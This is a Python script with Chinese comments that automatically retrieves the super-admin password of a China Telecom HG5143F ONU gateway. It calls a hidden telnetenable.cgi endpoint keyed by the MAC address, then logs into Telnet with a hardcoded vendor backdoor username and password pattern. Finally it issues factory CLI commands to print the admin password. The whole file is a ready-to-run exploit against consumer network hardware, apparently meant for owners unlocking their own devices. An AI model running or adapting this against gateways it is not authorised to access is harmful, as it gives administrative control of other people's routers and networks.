# coding=utf-8

# AGPLv3+ License. By Gxxk(Frez79).
# 全自动获取 电信网关HG5143F(ONU) 的超管密码.
# 仅在Win10LTSC2021/Py3.12.6上测试通过.
# 基于此教程编写：https://blog.csdn.net/weixin_45736958/article/details/135500085


# 导入模块
try:
    import subprocess
    import re
    import requests
    import socket
    import time
except ModuleNotFoundError:
    raise ModuleNotFoundError("请安装requests库并确保Python版本低于Py3.12!")
try:
    import pyperclip
    clipboardStat = True
except ModuleNotFoundError:
    clipboardStat = False


print(60*"H")
print("全自动获取 电信网关HG5143F(ONU) 的超管密码.")
print("HG5143F(ONU) v4.10.M5001测试有效")
print("AGPLv3+ License. By Gxxk.")
print(60*"H"+'\n')


# 网关信息获取
ip = "192.168.1.1" if (temp := input("网关IP(192.168.1.1):")) == "" else temp # 网关IP
assert re.match(r"\b(?:\d{1,3}\.){3}\d{1,3}\b",ip),Exception("不符规范的IP地址")

mac = subprocess.check_output(
    f"arp -a {ip}", shell=True).decode('utf-8', errors='ignore').upper() # 网关MAC码获取
try:
    mac = re.search("[A-F0-9]{2}(-[A-F0-9]{2}){5}",
                    mac).group().split("-")  # 从命令输出中提取网关MAC码
except:pass
mac = "".join(mac) if (temp := input(f"网关IP({'-'.join(mac)}):")) == "" else temp # 网关IP
assert re.match("^[A-F0-9]+$",mac),Exception("不符规范的MAC地址(不应存在特殊字符)")


# 开启网关Telnet
requestStat = requests.get(
    f"http://{ip}:8080/cgi-bin/telnetenable.cgi?key={''.join(mac)}&telnetenable=1")
if requestStat.status_code != 200:
    raise Exception("无法开启Telnet! 请检查型号/版本或网关可用性")

def receive_until(sock, prompt, tmo=5,bufferNum=256):
    startTime=time.time()
    data = b""
    while True:
        chunk = sock.recv(bufferNum)
        if not chunk:
            raise Exception("连接已关闭")
        data += chunk
        if prompt in data:
            break
        if (time.time() - startTime) >= tmo:
            raise Exception("超时!")
    return data

tnUsername = "telnetadmin"  # Telnet用户名
tnPwd = f"FH-nE7jA%5m{mac[-6:]}"  # Telnet密码

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tn:
    tn.connect((ip, 23)) # 连接Telnet
    print(f"从端口23连接到{ip}")
    print("等待回复...",end="\r")
    receive_until(tn,b"Login:")
    
    print(f"输入用户名：{tnUsername}")
    tn.sendall(f"{tnUsername}\n".encode())
    print("等待回复...",end="\r")
    receive_until(tn,b"Password:")

    print(f"输入密码：{tnPwd}")
    tn.sendall(f"{tnPwd}\n".encode())
    print("等待回复...",end="\r")
    receive_until(tn,b"$")

    print("尝试获取超密...")
    tn.sendall(b"load_cli factory\nshow admin_pwd\n")
    print("等待回复...",end="\r")
    tnContent = receive_until(tn,b"telecomadmin").decode() # 利用缓冲区读取的特性获取全部内容
    # 为了保留日志而有意为之

    output = re.search(r"telecomadmin\d{8}", tnContent)
    print(f"TelnetLog:\n{tnContent}\n")
    print(60*"H")
    if output:
        print(
            f"获取成功. 超密{'[已复制至剪贴板]' if clipboardStat else ''}:{output.group()}")
        if clipboardStat:
            pyperclip.copy(output.group())
    else:
        print("未能获取超密,请检查 版本/型号 后再试一次.或许可以跟着教程手动走一遍？\n教程：https://blog.csdn.net/weixin_45736958/article/details/135500085")

input('回车键以退出...')
